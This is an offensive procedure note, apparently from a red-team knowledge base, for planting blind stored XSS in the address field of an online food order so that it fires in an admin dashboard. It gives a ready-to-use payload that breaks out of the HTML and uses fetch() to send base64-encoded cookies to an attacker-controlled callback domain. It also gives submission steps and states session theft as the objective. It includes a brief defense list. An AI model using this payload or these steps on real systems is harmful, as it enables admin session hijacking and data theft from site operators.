---
id: 58e4e985-b87c-4e8d-8c00-fba57e742c8d
name: Inject Blind Stored XSS into Order Address
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:27.238Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - xss
  - injection
  - stored-xss
commands: []
platforms:
  - Web
tools:
  - '[[tools/XSS-Hunter]]'
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---

# Inject Blind Stored XSS into Order Address

## Summary

This procedure demonstrates injecting a blind stored XSS payload into the address field of an order placement form on a web application like Zomato, where the input is stored without sanitization and later reflected in an admin interface.

## Description

In this attack, a user submits an order with a malicious JavaScript payload embedded in the address field. Due to insufficient server-side sanitization, the payload is stored in the database and rendered unsanitized when an admin views the order details in their dashboard. This leads to arbitrary JavaScript execution in the admin's browser context, potentially allowing session hijacking or data theft. The blind nature means no immediate feedback to the attacker, requiring tools like XSS Hunter for detection via callbacks.

## Requirements

1. Valid user account on the target web application
2. Access to the order placement form
3. [[tools/XSS-Hunter]] instance for payload callbacks
4. Basic knowledge of JavaScript payloads for data exfiltration

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization on all user inputs, especially in forms
- Use output encoding (e.g., HTML entity encoding) when rendering user data in admin panels
- Employ Content Security Policy (CSP) to restrict script execution
- Monitor for anomalous callbacks to external domains via WAF logs

## Objectives

1. Store malicious JavaScript in the backend without detection
2. Prepare for execution in a privileged context
3. Exfiltrate admin session data upon trigger

## Instructions

### Step 1: Prepare Payload

**Context**: Craft a payload that breaks out of the HTML context and executes JavaScript, using a callback to detect blind execution.

Generate a unique payload via [[tools/XSS-Hunter]] and modify it for the address field.

Example payload:

```html
"><script>fetch('https://your-xss-hunter-domain.com/report?cookie='+btoa(document.cookie));</script>
```

> This payload closes any open tags and injects a script that sends base64-encoded cookies to your endpoint.

### Step 2: Submit Order

**Context**: Place an order on the target site, appending the payload to the address field.

Log in, select items, and enter the address as "Legitimate Address[Payload]". Submit the order.

**Expected Output**: Order confirmation page or email, with no visible errors.

> Success is confirmed later via callback; immediate indicators include no form rejection.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/XSS-Hunter]]

## Tags

- [[xss]]
- [[injection]]
